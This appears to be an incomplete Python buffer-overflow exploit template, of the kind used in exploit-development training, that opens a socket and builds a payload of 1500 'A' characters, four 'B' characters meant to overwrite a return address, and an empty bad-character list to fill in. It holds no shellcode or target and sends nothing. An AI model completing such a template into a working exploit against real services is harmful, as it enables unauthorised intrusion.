#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = ""
#insert bad charactiers above

buffer="A"*1500 + "B"*4 + badchars
#
